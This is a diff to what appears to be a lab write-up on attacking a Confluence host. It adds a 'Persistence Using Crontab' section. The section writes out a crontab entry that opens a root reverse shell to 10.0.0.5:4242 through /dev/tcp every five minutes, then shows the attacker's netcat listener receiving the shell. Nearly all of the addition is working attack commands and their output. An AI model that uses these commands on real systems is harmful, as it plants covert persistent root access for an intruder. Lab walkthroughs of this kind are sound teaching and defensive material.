@@ -284,6 +284,24 @@ whoami
 root
 ```
 
+#### Persistence Using Crontab
+- After gaining root access via privilege escalation, create crontab to run /bin/bash every 5mins on port 4242.
+- Allows attacker to regain root privileges by listening to port 4242.
+
+```console
+root@confluence:/tmp# (crontab -l ; echo "*/5 * * * * sleep 1 && /bin/bash -c '/bin/bash -i >& /dev/tcp/10.0.0.5/4242 0>&1'")|crontab 2> /dev/null
+```
+##### Regain
+```console
+root@kali:/# nc -nvlp 4242
+listening on [any] 4242 ...
+connect to [10.0.0.5] from (UNKNOWN) [10.0.0.3] 35094
+bash: cannot set terminal process group (23962): Inappropriate ioctl for device
+bash: no job control in this shell
+root@confluence:~# whoami
+root
+```
+
 #### Automation Script
 ```console
 HOST-MACHINE@HOST $ vagrant provision --provision-with persistence 
